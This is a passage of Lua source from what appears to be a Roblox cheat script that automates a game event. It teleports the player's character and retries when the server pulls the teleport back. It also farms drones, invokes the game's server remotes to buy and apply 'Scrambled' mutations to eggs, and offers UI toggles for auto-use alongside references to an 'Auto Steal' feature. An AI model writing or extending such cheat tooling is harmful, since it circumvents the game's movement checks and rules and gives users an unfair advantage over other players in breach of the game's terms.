		local function hasScrambleDrops()
			local serverTimeNow = workspace:GetServerTimeNow()
			local isWindowActive, windowRemaining = isScrambleWindowActive()
			if isWindowActive and windowRemaining and windowRemaining < 25 then
				return next(scrambleClaimedParts) ~= nil
			end

			for _, dropData in pairs(scrambleClaimedParts) do
				if dropData.Kind == "Part" or dropData.ExpiresAt and dropData.ExpiresAt - serverTimeNow < 30 then
					return true
				end
			end

			return false
		end

		local lastScrambleWindowIndex = nil

		local function getScrambleWindowIndex()
			local window = type(scrambleSnapshot) == "table" and scrambleSnapshot.Window or nil
			return type(window) == "table" and window.Index or nil
		end

		local function scrambleDronesLoop(isCancelledFn)
			local wasActiveWindow = lastScrambleWindowIndex ~= nil and lastScrambleWindowIndex == getScrambleWindowIndex()

			while not isCancelledFn() do
				RunService.Heartbeat:Wait()
				if isCancelledFn() then
					break
				end
				updateDroneStatesFromWorkspace()

				if hasScrambleDrops() then
					scrambleCollectDrops(isCancelledFn)
				end

				if isInsideBase() then
					scrambleMoveStop()
					if not leaveScrambleBase(isCancelledFn) then
						break
					end
				end

				local droneTarget = findBestDroneTarget()

				if not droneTarget and next(scrambleClaimedParts) ~= nil then
					scrambleCollectDrops(isCancelledFn)
					updateDroneStatesFromWorkspace()
					droneTarget = findBestDroneTarget()
				end

				if not droneTarget then
					if not isScrambleWindowActive() or wasActiveWindow then
						break
					end
					lastScrambleWindowIndex = getScrambleWindowIndex()
					wasActiveWindow = true
					if not scramblePatrolForDrones(isCancelledFn) then
						break
					end
					continue
				end

				local position = getDroneVisualPosition(droneTarget) or droneTarget.Position
				local rootPart = getRootPart()
				local magnitude = rootPart and (rootPart.Position - position).Magnitude or 0
				local canTeleport = scrambleMoveMode == "Teleport" and rootPart

				if canTeleport then
					canTeleport = not (isInsideBase() and not isInsideBase(position))
				end

				if canTeleport then
					if magnitude > scrambleHitboxRadius and magnitude <= scrambleHoverHeight and os.clock() >= scrambleTeleportCooldown and os.clock() - scrambleLastTeleportTime >= scrambleTeleportInterval then
						scrambleLastTeleportTime = os.clock()
						local hoverY = scrambleInvisState and 16 or 5
						local targetPos = position + Vector3.new(0, -1, hoverY)
						scrambleMoveStart(targetPos, position)
						local rootPart2 = getRootPart()

						if rootPart2 then
							scrambleStatusStr = "Teleporting to the next drone"

							pcall(function()
								rootPart2.CFrame = CFrame.lookAt(targetPos, Vector3.new(position.X, targetPos.Y, position.Z))
								rootPart2.AssemblyLinearVelocity = Vector3.zero
								rootPart2.AssemblyAngularVelocity = Vector3.zero
							end)

							local timeout = os.clock() + 0.8

							while os.clock() < timeout and not isCancelledFn() do
								local rootPart3 = getRootPart()

								if rootPart3 and (rootPart3.Position - targetPos).Magnitude > 40 then
									scrambleTeleportCooldown = os.clock() + 30
									scrambleStatusStr = "Teleport pulled back, tweening"
									break
								else
									RunService.Heartbeat:Wait()
								end
							end
						end
					end
				end

				scrambleSmashDrone(droneTarget, isCancelledFn)
			end

			scrambleCollectDrops(isCancelledFn)
			scrambleMoveStop()
		end

		local scrambleLostPartNames = { LostPart1 = "Mechanical Gear", LostPart2 = "Wiring Harness" }

		chilliState.ScrambleLostPart = function(partName)
			return hasCollectedScramblePart(getScrambleState(), partName)
		end

		getScramblePartsStatus = function()
			local stateObj = getScrambleState()
			if not stateObj then
				return "Lost Parts: no event data"
			end
			local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
			local statusList = {}
			local onMapCount = 0
			local collectedCount = 0

			for _, partName in ipairs(scrambleLostParts) do
				local partModel = drScrambleEvent and drScrambleEvent:FindFirstChild(partName)

				if partModel then
					onMapCount += 1
				end

				if hasCollectedScramblePart(stateObj, partName) then
					collectedCount += 1
				elseif partModel then
					local ok, pivotCFrame = pcall(partModel.GetPivot, partModel)
					local dist = ok and chilliState.DistanceTo(pivotCFrame.Position) or nil
					statusList[#statusList + 1] = dist and string.format("%s %d studs", scrambleLostPartNames[partName], math.floor(dist)) or scrambleLostPartNames[partName]
				else
					statusList[#statusList + 1] = scrambleLostPartNames[partName] .. " not on map"
				end
			end

			local summaryStr = string.format("Lost Parts on map %d/2  -  Collected %d/2", onMapCount, collectedCount)
			local fullStr

			if #statusList > 0 then
				fullStr = summaryStr .. "  -  " .. table.concat(statusList, "  -  ")
			else
				fullStr = summaryStr
			end

			return fullStr
		end

		local function exitScrambleCave(isCancelledFn)
			if not isInsideScrambleCave() then
				return true
			end
			local exitPrompt = getCaveTeleporterPrompt("Exit")
			local exitPos = getPromptPosition(exitPrompt, nil)
			if not exitPos then
				return false
			end
			scrambleStatusStr = "Leaving the Secret Cave"
			if not scrambleWalkTo(exitPos, isCancelledFn, 4) then
				return false
			end

			for i = 1, 4 do
				if isCancelledFn() then
					return false
				end
				firePrompt(exitPrompt or getCaveTeleporterPrompt("Exit"))
				local timeout = os.clock() + 1.5

				while os.clock() < timeout and isInsideScrambleCave() do
					RunService.Heartbeat:Wait()
				end

				if not isInsideScrambleCave() then
					return true
				end
			end

			return not isInsideScrambleCave()
		end

		local function isBaseWallSealed()
			return chilliState.IsNight() or chilliState.WallSealed()
		end

		local function waitForBaseWall(isCancelledFn)
			if not isBaseWallSealed() then
				return true
			end
			scrambleMoveStop()

			while isBaseWallSealed() and not isCancelledFn() do
				scrambleStatusStr = chilliState.IsNight() and "Night, waiting for the wall to drop" or "Waiting for the wall to drop"
				RunService.Heartbeat:Wait()
			end

			return not isCancelledFn()
		end

		isScrambleDroneHuntActive = function()
			if not chilliState.Toggle(nil, false) or not isScrambleEventActive() then
				return false
			end

			if scrambleHoldState.Ended then
				return false
			end

			if isScrambleWindowActive() then
				return true
			end
			updateDroneStatesFromWorkspace()
			return #getValidDrones() > 0 or next(scrambleClaimedParts) ~= nil
		end
		fn34 = isScrambleDroneHuntActive

		isScrambleCollectLostPartsActive = function()
			local scrambleState = getScrambleState()
			if not scrambleState or scrambleState.Completed == true or not isScrambleEventActive() then
				return false
			end
			local totalPartsCount = tonumber(scrambleState.TotalParts)

			if not totalPartsCount then
				totalPartsCount = getCollectedPartsCount(scrambleState) + (tonumber(scrambleState.DroneParts) or 0)
			end

			local wantsLostParts = chilliState.Toggle(nil, false)

			if wantsLostParts then
				local totalLostParts = #scrambleLostParts
				wantsLostParts = getCollectedPartsCount(scrambleState) < totalLostParts
			end

			local wantsCaveVisit = chilliState.Toggle(nil, false) and (totalPartsCount >= 5 or scrambleState.Discovered ~= true)
			return wantsLostParts or wantsCaveVisit
		end
		fn35 = isScrambleCollectLostPartsActive

		runScrambleAutomationLoop = function(taskInstanceId)
			local function isCancelled()
				return taskInstanceId ~= scrambleActionStamp or chilliState.Movement.Owner ~= "scramble"
			end

			local function shouldInterruptDrones()
				return isCancelled() or not isScrambleDroneHuntActive() or isBaseWallSealed()
			end

			while true do
				if isScrambleDroneHuntActive() and not isCancelled() then
					if waitForBaseWall(isCancelled) then
						pcall(scrambleDronesLoop, shouldInterruptDrones)
						if isBaseWallSealed() then
							continue
						end
					end
				end

				break
			end

		scrambleMoveStop()
		if isCancelled() or isScrambleDroneHuntActive() then
			return
		end

		if not isScrambleCollectLostPartsActive() then
			if scrambleReturnToSafeZone then
				scrambleReturnToSafeZone(isCancelled)
			end
			scrambleStatusStr = ""
			return
		end

		if not waitForBaseWall(isCancelled) then
			return
		end
		refreshScrambleSnapshot(true)
		local scrambleState = getScrambleState()
		if not scrambleState then
			return
		end

		if not isScrambleCollectLostPartsActive() then
			scrambleStatusStr = ""
			return
		end

		if chilliState.Toggle(nil, false) and scrambleState.Discovered ~= true then
			if discoverScrambleEvent then
				pcall(discoverScrambleEvent, isCancelled)
			end
		end

		if chilliState.Toggle(nil, false) then
			if collectLostParts then
				pcall(collectLostParts, function()
					return isCancelled() or not chilliState.Toggle(nil, false) or isScrambleDroneHuntActive() or isBaseWallSealed()
				end)
			end
		end

		if chilliState.Toggle(nil, false) then
			if openScrambleVault then
				pcall(openScrambleVault, function()
					return isCancelled() or not chilliState.Toggle(nil, false) or isScrambleDroneHuntActive() or isBaseWallSealed()
				end)
			end
		end

		if isInScrambleCave and isInScrambleCave() and not isCancelled() then
			pcall(exitScrambleCave, isCancelled)
		end

		if (not isInScrambleCave or not isInScrambleCave()) and not isScrambleDroneHuntActive() then
			if scrambleReturnToSafeZone then
				pcall(scrambleReturnToSafeZone, isCancelled)
			end
		end
	end
	fn36 = runScrambleAutomationLoop
	end

	local leaveTreadmillForScramble
	local fn37

	leaveTreadmillForScramble = function(isCancelledFn)
		if not (chilliState.Treadmill.Riding or chilliState.OnBelt()) then
			return true
		end

		for attempt = 1, 3 do
			if isCancelledFn() then
				return false
			end
			scrambleStatusStr = "Jumping off the treadmill"
			chilliState.Treadmill.Riding = false
			task.spawn(chilliState.LeaveBelt)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					humanoid.Sit = false
					humanoid.Jump = true
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end)
			end

			local rootPart = getRootPart()

			if rootPart then
				local startPosition = rootPart.Position
				local targetPosition = startPosition + Vector3.new(0, 18, 0)
				local jumpStartTime = os.clock()

				while true do
					RunService.Heartbeat:Wait()
					local currentRootPart = getRootPart()

					if not currentRootPart then
						break
					else
						local jumpProgress = math.min(1, (os.clock() - jumpStartTime) / 0.25)

						pcall(function()
							local rotation = currentRootPart.CFrame.Rotation
							currentRootPart.CFrame = CFrame.new(startPosition:Lerp(targetPosition, jumpProgress)) * rotation
							currentRootPart.AssemblyLinearVelocity = Vector3.zero
							currentRootPart.AssemblyAngularVelocity = Vector3.zero
						end)

						if not (jumpProgress >= 1) then
							continue
						end
						break
					end
				end
			end

			if not (chilliState.Treadmill.Riding or chilliState.OnBelt()) then
				return true
			end
		end

		return not chilliState.OnBelt()
	end
	fn37 = leaveTreadmillForScramble

	do
		local eggSortPriorities = { "Highest Value", "Best Rarity", "Biggest Size" }
		local scrambledUiColors = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }
		local eggApplyRadius = 6

		local applyScrambledState = {
			Handle = nil,
			BuyHandle = nil,
			Loop = 0,
			MinRarity = 0,
			MinIncome = 0,
			Priority = eggSortPriorities[1],
			SkipMutated = true,
			Targets = {},
			Cooldown = 0,
			Status = "Idle",
			State = "idle",
			Detail = "Turn it on to start applying Scrambled",
			RarityColor = "#FFFFFF",
			Icon = "",
			Ui = {},
			Row = nil,
			Left = 0,
			Pen = 0,
			Match = 0,
			Tries = 0,
			Hits = 0,
			Locked = nil,
			Short = false,
			EggOptions = {},
			EggCategory = {},
		}

		local directory = gameModules.Assets and gameModules.Assets.Directory
		local eggRarityCache = {}

		if type(directory) == "table" then
			for k, assetInfo in pairs(directory) do
				local rarity = type(assetInfo) == "table" and assetInfo.Rarity or nil
				local rarityNum = type(rarity) == "table"

				if rarityNum then
					rarityNum = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				local finalRarity = rarityNum or nil

				if finalRarity then
					table.insert(eggRarityCache, {
						Category = tostring(k),
						Name = tostring(assetInfo.DisplayName or k),
						Rarity = finalRarity,
						RarityName = tostring(rarity.DisplayName or rarity._id or finalRarity),
					})
				end
			end
		end

		table.sort(eggRarityCache, function(a, b)
			if a.Rarity ~= b.Rarity then
				return a.Rarity > b.Rarity
			end
			return a.Name < b.Name
		end)

		for _, eggInfo in ipairs(eggRarityCache) do
			local label = string.format("%s [%s]", eggInfo.Name, eggInfo.RarityName)

			if applyScrambledState.EggCategory[label] then
				label = string.format("%s [%s] (%s)", eggInfo.Name, eggInfo.RarityName, eggInfo.Category)
			end

			table.insert(applyScrambledState.EggOptions, label)
			applyScrambledState.EggCategory[label] = eggInfo.Category
		end

		local function getEggAssetInfo(assetCategory)
			local directory2 = gameModules.Assets and gameModules.Assets.Directory
			return type(directory2) == "table" and directory2[tostring(assetCategory)] or nil
		end

		local function getEggRarityNum(eggData)
			local assetInfo = getEggAssetInfo(eggData.AssetCategory)
			local rarity = type(assetInfo) == "table" and assetInfo.Rarity or nil
			local rarityNum = type(rarity) == "table"

			if rarityNum then
				rarityNum = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			return rarityNum or 0
		end

		local function getEggIncome(eggData)
			local assetInfo = getEggAssetInfo(eggData.AssetCategory)
			local earningRate = type(assetInfo) == "table" and tonumber(assetInfo.EarningRate) or 0
			local scale = tonumber(eggData.AssetScale) or 0
			if earningRate <= 0 or scale <= 0 then
				return 0
			end
			return earningRate * (scale > 5 and (scale / 5) ^ 1.2 * 19.637875755794113 or scale ^ 1.85)
		end

		local function isEggScrambled(eggData)
			if tostring(eggData.BaseMutation or "") == "Scrambled" then
				return true
			end

			if type(eggData.Mutations) == "table" then
				for key, mutation in pairs(eggData.Mutations) do
					if type(mutation) == "string" and mutation == "Scrambled" then
						return true
					end

					if type(key) == "string" and key == "Scrambled" and mutation ~= false then
						return true
					end
				end
			end

			return false
		end

		local function getOwnerEggs()
			local eggState = gameModules.EggState
			if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
				return {}
			end
			local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			if not ok or type(result) ~= "table" then
				return {}
			end
			local ownerEggsList = {}

			for eggId, eggData in pairs(result) do
				if type(eggData) == "table" and eggData.Placement ~= nil then
					eggId = eggData.Uid or eggId
					eggData.Uid = eggId
					ownerEggsList[#ownerEggsList + 1] = eggData
				end
			end

			return ownerEggsList
		end

		local function getEggPosition(eggData)
			local eggId = eggData and eggData.Uid

			if eggId then
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				local eggModel = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(eggId)

				if eggModel then
					local ok, pos = pcall(function()
						return eggModel:GetPivot().Position
					end)

					if ok and typeof(pos) == "Vector3" then
						return pos
					end
				end
			end

			if type(chilliState.PenAnchor) == "function" then
				local ok, anchorPos = pcall(chilliState.PenAnchor)
				if ok and typeof(anchorPos) == "Vector3" then
					return anchorPos
				end
			end

			return nil
		end

		local function walkToEgg(eggData, loopId)
			local targetPos = getEggPosition(eggData)
			if targetPos == nil then
				return true
			end

			if chilliState.DistanceTo(targetPos) <= eggApplyRadius then
				return true
			end

			local function isCancelledFn()
				if loopId ~= applyScrambledState.Loop or not chilliState.Toggle(applyScrambledState.Handle, false) then
					return true
				end

				if chilliState.Movement.PlaceWanted == true then
					return true
				end
				return chilliState.Movement.ScrambleWanted == true or chilliState.Steal.Wanted == true
			end

			if chilliState.Treadmill.Riding or chilliState.OnBelt() then
				chilliState.ExitBelt()
			end

			chilliState.HoldBelt()
			local ok, result = pcall(chilliState.FlyTo, targetPos + Vector3.new(0, 3, 0), isCancelledFn, "mutation")
			chilliState.ReleaseBelt()
			chilliState.LeaveBelt()
			result = ok and result

			if result then
				local arriveRadius = eggApplyRadius + 4
				result = chilliState.DistanceTo(targetPos) <= arriveRadius
			end

			return result
		end

		local getMutationTool = findScrambledMutationTool

		local function getToolUses(tool)
			if not tool then
				return 0
			end
			local usesAttr = tonumber(tool:GetAttribute("Uses"))
			if usesAttr ~= nil then
				return usesAttr
			end
			local usesMatch = string.match(tool.Name, "%[X(%d+)%]")
			return tonumber(usesMatch) or 1
		end

		local function getMutationToolWithUses()
			local tool = getMutationTool()
			if not tool then
				return nil, 0
			end
			local uses = getToolUses(tool)
			if uses <= 0 then
				return nil, 0
			end
			return tool, uses
		end

		applyScrambledState.Grip = function(tool)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if not character or not humanoid or not tool or tool.Parent == nil then
				return false
			end

			if tool.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(tool)
				end)

				if tool.Parent ~= character then
					pcall(function()
						tool.Parent = character
					end)
				end

				task.wait(0.2)
			end

			return tool.Parent == character
		end

		local function tryBuyScrambled()
			if not chilliState.Toggle(applyScrambledState.BuyHandle, false) or isBuyingScrambled then
				return false
			end
			isBuyingScrambled = true
			local success = false

			local ok, result = pcall(function()
				success = applyScrambledState.Purchase()
			end)

			isBuyingScrambled = false

			if not ok then
				applyScrambledState.Status = "Buy failed: " .. tostring(result)
			end

			return success
		end

		applyScrambledState.Purchase = function()
			local boughtCount = 0
			local isShort = false

			for i = 1, 10 do
				local snapshotObj = boughtCount == 0 and getScrambleState(true) or scrambleSnapshot
				local scrambleState = getScrambleState()

				if not (type(snapshotObj) ~= "table" or type(scrambleState) ~= "table") then
					local iter, state, index = ipairs(type(snapshotObj.Shop) == "table" and snapshotObj.Shop or {})
					local scrambledItem = nil

					for _, shopItem in iter, state, index do
						if type(shopItem) == "table" and shopItem.Id == "MutationConsumable" then
							scrambledItem = shopItem
						end
					end

					if scrambledItem then
						local purchaseLimit = tonumber(scrambledItem.PurchaseLimit)

						if not (purchaseLimit and getScrambleShopPurchases(scrambleState, scrambledItem) >= purchaseLimit) then
							local itemPrice = tonumber(scrambledItem.Price) or math.huge

							if (tonumber(scrambleState.Samples) or 0) - itemPrice < (scrambleSamplesReserve or 0) then
								isShort = true

								if boughtCount == 0 then
									applyScrambledState.Status = "Need " .. tostring(math.floor(itemPrice)) .. " Samples"
								end

								break
							else
								local buyResult = invokeScramble("Shop", scrambledItem.Id, { Quote = scrambledItem.Quote, Sequence = tonumber(scrambleState.ShopSequence) or 0 })

								if not (type(buyResult) ~= "table" or buyResult.Ok ~= true) then
									boughtCount += 1
									task.wait(0.4)
									continue
								end
							end
						end
					end
				end

				break
			end

			if boughtCount > 0 then
				applyScrambledState.Status = string.format("Bought %d Scrambled", boughtCount)
				applyScrambledState.Short = isShort
				return true
			end

			applyScrambledState.Short = isShort
			return false
		end

		local function findBestEggToScramble()
			local eggCount = 0
			local matchCount = 0
			local bestScore = -1
			local bestEgg = nil

			for _, eggData in ipairs(getOwnerEggs()) do
				eggCount += 1
				local skipMutated = applyScrambledState.SkipMutated and isEggScrambled(eggData)
				local isFiltered = false

				if skipMutated then
					isFiltered = true
				end

				local checkRarity = not isFiltered

				if checkRarity then
					local minRarity = applyScrambledState.MinRarity
					checkRarity = getEggRarityNum(eggData) < minRarity
				end

				if checkRarity then
					isFiltered = true
				end

				local checkIncome = not isFiltered and applyScrambledState.MinIncome > 0

				if checkIncome then
					local minIncome = applyScrambledState.MinIncome
					checkIncome = getEggIncome(eggData) < minIncome
				end

				if checkIncome then
					isFiltered = true
				end

				if not isFiltered and next(applyScrambledState.Targets) ~= nil and applyScrambledState.Targets[tostring(eggData.AssetCategory)] ~= true then
					isFiltered = true
				end

				if not isFiltered then
					matchCount += 1
					local score

					if applyScrambledState.Priority == eggSortPriorities[2] then
						score = getEggRarityNum(eggData) * 1000 + (tonumber(eggData.AssetScale) or 0)
					elseif applyScrambledState.Priority == eggSortPriorities[3] then
						score = tonumber(eggData.AssetScale) or 0
					else
						score = getEggIncome(eggData)
					end

					local isBetter = score > bestScore

					if not isBetter and bestEgg ~= nil and score == bestScore and eggData.Uid == applyScrambledState.Locked then
						bestScore = score
						bestEgg = eggData
					elseif isBetter then
						bestScore = score
						bestEgg = eggData
					end
				end
			end

			applyScrambledState.Pen = eggCount
			applyScrambledState.Match = matchCount
			return bestEgg
		end

		local function color3ToHex(color3)
			if typeof(color3) ~= "Color3" then
				return "#FFFFFF"
			end
			return string.format("#%02X%02X%02X", math.floor(color3.R * 255 + 0.5), math.floor(color3.G * 255 + 0.5), math.floor(color3.B * 255 + 0.5))
		end

		local function adjustRarityColorHex(hexColor)
			local ok, result = pcall(Color3.fromHex, hexColor)
			if not ok or typeof(result) ~= "Color3" then
				return hexColor
			end
			local h, s, v = result:ToHSV()
			return color3ToHex(Color3.fromHSV(h, math.min(s, 0.78), math.max(v, 0.82)))
		end

		local function getEggIcon(eggData)
			local assetInfo = getEggAssetInfo(eggData and eggData.AssetCategory)
			local icon = type(assetInfo) == "table" and assetInfo.Icon or nil
			if icon == nil then
				return ""
			end

			if tonumber(icon) then
				return "rbxassetid://" .. tostring(icon)
			end
			return tostring(icon)
		end

		local function getEggRarityInfo(eggData)
			local assetInfo = getEggAssetInfo(eggData and eggData.AssetCategory)
			local rarity = type(assetInfo) == "table" and assetInfo.Rarity or nil
			local rarityName = type(rarity) == "table"

			if rarityName then
				rarityName = tostring(rarity.DisplayName or rarity._id or "")
			end

			rarityName = rarityName or ""
			local colorHex = table.pack(adjustRarityColorHex(color3ToHex(type(rarity) == "table" and rarity.Color or nil)))
			return rarityName, table.unpack(colorHex, 1, colorHex.n)
		end

		local function getEggDisplayName(eggData)
			if type(eggData) ~= "table" then
				return "No egg selected"
			end
			local assetInfo = getEggAssetInfo(eggData.AssetCategory)
			local displayName = type(assetInfo) == "table"

			if displayName then
				displayName = tostring(assetInfo.DisplayName or eggData.AssetCategory)
			end

			return displayName or tostring(eggData.AssetCategory)
		end

		local function updateApplyScrambledUi()
			local idleColor = scrambledUiColors[applyScrambledState.State] or scrambledUiColors.idle

			if applyScrambledState.Ui.Accent and type(applyScrambledState.Ui.Accent.Set) == "function" then
				applyScrambledState.Ui.Accent.Set({ Background = idleColor })
			end

			if applyScrambledState.Ui.Title and type(applyScrambledState.Ui.Title.Set) == "function" then
				applyScrambledState.Ui.Title.Set({ Text = applyScrambledState.Status, Color = idleColor })
			end

			if applyScrambledState.Ui.Egg and type(applyScrambledState.Ui.Egg.Set) == "function" then
				applyScrambledState.Ui.Egg.Set({ Text = applyScrambledState.Detail, Color = applyScrambledState.RarityColor })
			end

			if applyScrambledState.Ui.Meta and type(applyScrambledState.Ui.Meta.Set) == "function" then
				applyScrambledState.Ui.Meta.Set({
					Text = string.format("Charges %d  Eggs %d/%d  Tries %d  Applied %d", applyScrambledState.Left, applyScrambledState.Match, applyScrambledState.Pen, applyScrambledState.Tries, applyScrambledState.Hits),
				})
			end

			if applyScrambledState.Ui.Icon and type(applyScrambledState.Ui.Icon.Set) == "function" then
				applyScrambledState.Ui.Icon.Set({ Visible = applyScrambledState.Icon ~= "", Image = applyScrambledState.Icon, StrokeColor = applyScrambledState.RarityColor })
			end

			if applyScrambledState.Row and type(applyScrambledState.Row.Set) == "function" then
				pcall(applyScrambledState.Row.Set, applyScrambledState.Row, applyScrambledState.Status .. "  -  " .. applyScrambledState.Detail)
			end
		end

		local function updateApplyScrambledDetail(eggData)
			if type(eggData) ~= "table" then
				applyScrambledState.Detail = "No egg matches the filters"
				applyScrambledState.RarityColor = "#C7CBD6"
				applyScrambledState.Icon = ""
				return
			end

			local rarityName, colorHex = getEggRarityInfo(eggData)
			local scale = tonumber(eggData.AssetScale) or 0
			applyScrambledState.Detail = string.format("%s   %.2f kg", getEggDisplayName(eggData), scale)

			if rarityName ~= "" then
				applyScrambledState.Detail = applyScrambledState.Detail .. "   " .. string.upper(rarityName)
			end

			applyScrambledState.RarityColor = colorHex
			applyScrambledState.Icon = getEggIcon(eggData)
		end

		applyScrambledState.Apply = function(eggData, tool)
			if not applyScrambledState.Grip(tool) then
				applyScrambledState.State = "work"
				applyScrambledState.Status = "Could not hold Scrambled"
				applyScrambledState.Cooldown = os.clock() + 2
				return false
			end

			local packages = ReplicatedStorage:FindFirstChild("Packages")
			packages = packages and packages:FindFirstChild("Networking")
			local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")

			if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
				applyScrambledState.State = "stop"
				applyScrambledState.Status = "Mutation remote is missing"
				applyScrambledState.Cooldown = os.clock() + 10
				return false
			end

			applyScrambledState.State = "work"
			applyScrambledState.Status = "Applying Scrambled"
			applyScrambledState.Tries = applyScrambledState.Tries + 1

			local ok, result = pcall(function()
				return rfBossMasteryAskUseMutationConsu:InvokeServer(eggData.Uid)
			end)

			if not ok or type(result) ~= "table" then
				applyScrambledState.Cooldown = os.clock() + 10
				return false
			end

			if result.Success == true then
				applyScrambledState.Status = "Scrambled applied"
				applyScrambledState.Locked = nil
				applyScrambledState.State = "good"
				applyScrambledState.Hits = applyScrambledState.Hits + 1
				return true
			end

			local resultMsg = tostring(result.Message or "")
			local lowerMsg = string.lower(resultMsg)
			applyScrambledState.Status = resultMsg ~= "" and resultMsg or "Try failed"
			applyScrambledState.State = "work"

			if string.find(lowerMsg, "not found") or string.find(lowerMsg, "invalid") then
				applyScrambledState.Locked = nil
				applyScrambledState.Cooldown = os.clock() + 3
				return false
			end

			return true
		end

		applyScrambledState.Settle = function()
			local timeout = os.clock() + 3

			while os.clock() < timeout do
				if chilliState.Grounded() then
					return
				end
				RunService.Heartbeat:Wait()
			end
		end

		applyScrambledState.IsCancelled = function(loopId)
			if loopId ~= applyScrambledState.Loop or not chilliState.Toggle(applyScrambledState.Handle, false) then
				return true
			end

			if chilliState.Movement.PlaceWanted == true then
				return true
			end
			return chilliState.Movement.ScrambleWanted == true or chilliState.Steal.Wanted == true
		end

		applyScrambledState.Idle = function(status, detail, eggData)
			applyScrambledState.State = "idle"
			applyScrambledState.Status = status
			applyScrambledState.Left = 0
			applyScrambledState.Detail = detail
			applyScrambledState.RarityColor = "#C7CBD6"
			applyScrambledState.Icon = ""
			applyScrambledState.Cooldown = os.clock() + (eggData or 5)
		end

		local function applyScrambledLoop(loopId)
			if chilliState.Movement.ScrambleWanted == true or chilliState.Steal.Wanted == true then
				applyScrambledState.State = "work"
				applyScrambledState.Status = chilliState.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
				applyScrambledState.Cooldown = os.clock() + 2
				return
			end

			local cooldown = applyScrambledState.Cooldown
			if os.clock() < cooldown then
				return
			end
			local tool, uses = getMutationToolWithUses()

			if not tool then
				pcall(findBestEggToScramble)
				if tryBuyScrambled() then
					applyScrambledState.Cooldown = os.clock() + 0.5
					return
				end

				if applyScrambledState.Short then
					applyScrambledState.Idle("Out of Samples, waiting for more", "Hunt drones to earn Samples", 10)
					return
				end

				if not string.find(applyScrambledState.Status, "Samples", 1, true) then
					applyScrambledState.Status = "Need a Scrambled consumable"
				end

				applyScrambledState.Idle(applyScrambledState.Status, "Buy Scrambled from the event shop", 5)
				return
			end

			applyScrambledState.Left = uses
			local bestEgg = findBestEggToScramble()

			if not bestEgg or not bestEgg.Uid then
				applyScrambledState.State = "stop"
				applyScrambledState.Status = "Waiting"
				updateApplyScrambledDetail(nil)
				return
			end

			if chilliState.Movement.PlaceWanted == true then
				applyScrambledState.State = "work"
				applyScrambledState.Status = "Auto Place goes first"
				applyScrambledState.Cooldown = os.clock() + 2
				return
			end

			if not chilliState.ClaimMovement("mutation") then
				applyScrambledState.State = "work"
				applyScrambledState.Status = "Waiting for " .. tostring(chilliState.Movement.Owner or "movement")
				applyScrambledState.Cooldown = os.clock() + 2
				return
			end

			chilliState.Movement.MutationWanted = true

			local ok, result = pcall(function()
				while not applyScrambledState.IsCancelled(loopId) do
					local currentTool, currentUses = getMutationToolWithUses()

					if currentTool then
						applyScrambledState.Left = currentUses
						local currentTarget = findBestEggToScramble()

						if not currentTarget or not currentTarget.Uid then
							applyScrambledState.State = "stop"
							applyScrambledState.Status = "Waiting"
							updateApplyScrambledDetail(nil)
							break
						else
							if currentTarget.Uid ~= applyScrambledState.Locked then
								applyScrambledState.Locked = currentTarget.Uid
								applyScrambledState.Status = "New target picked"
							end

							updateApplyScrambledDetail(currentTarget)

							if not walkToEgg(currentTarget, loopId) then
								applyScrambledState.State = "work"
								applyScrambledState.Status = "Could not reach the egg"
								applyScrambledState.Cooldown = os.clock() + 3
								break
							elseif not applyScrambledState.IsCancelled(loopId) then
								if applyScrambledState.Apply(currentTarget, currentTool) then
									pcall(updateApplyScrambledUi)
									task.wait(0.35)
									continue
								end
							end
						end
					end

					break
				end
			end)

			if not ok then
				applyScrambledState.Status = "Stopped: " .. tostring(result)
				applyScrambledState.State = "work"
				applyScrambledState.Cooldown = os.clock() + 3
			end

			applyScrambledState.Settle()
			chilliState.Movement.MutationWanted = false
			chilliState.ReleaseMovement("mutation")
		end

		applyScrambledState.Handle = scrambleSection:CreateToggle({
			Name = "Auto Use Scrambled Mutation",
			Default = false,
			Callback = function(arg)
				applyScrambledState.Loop = applyScrambledState.Loop + 1
				chilliState.Movement.MutationWanted = false
				chilliState.ReleaseMovement("mutation")
				if arg ~= true then
					return
				end
				local loop = applyScrambledState.Loop

				task.spawn(function()
					while loop == applyScrambledState.Loop and chilliState.Toggle(applyScrambledState.Handle, false) do
						pcall(applyScrambledLoop, loop)
						pcall(updateApplyScrambledUi)
						task.wait(applyScrambledState.State == "idle" and 3 or 1)
					end
				end)
			end,
		})

		if type(scrambleSection.CreateCanvas) == "function" then
			local scrambledStatusCanvas = scrambleSection:CreateCanvas({
				Name = "Scrambled Status",
				ShowTitle = false,
				Layout = "free",
				SubOf = applyScrambledState.Handle,
				Style = {
					TextScale = 1,
					LineHeight = 1.1,
					MinLines = 4,
					MaxLines = 4,
					AutoHeight = true,
					BackgroundTransparency = 0.35,
					TextColor = Color3.fromRGB(255, 255, 255),
					TextStrokeTransparency = 0.7,
				},
				Build = function(canvasBuilder)
					applyScrambledState.Ui.Card = canvasBuilder:Frame({
						X = 0,
						Y = 0,
						Width = 1,
						Height = 3.6,
						Corner = 0.3,
						Background = "#151821",
						BackgroundTransparency = 0.25,
					})

					applyScrambledState.Ui.Accent = canvasBuilder:Frame({
						Parent = applyScrambledState.Ui.Card,
						X = 0.08,
						Y = 0.18,
						Width = 0.16,
						Height = 3.24,
						Corner = 0.2,
						Background = scrambledUiColors.idle,
					})

					applyScrambledState.Ui.Icon = canvasBuilder:Image({
						Parent = applyScrambledState.Ui.Card,
						X = 0.42,
						Y = 0.3,
						Width = 3,
						Height = 3,
						Corner = 0.3,
						Background = "#242938",
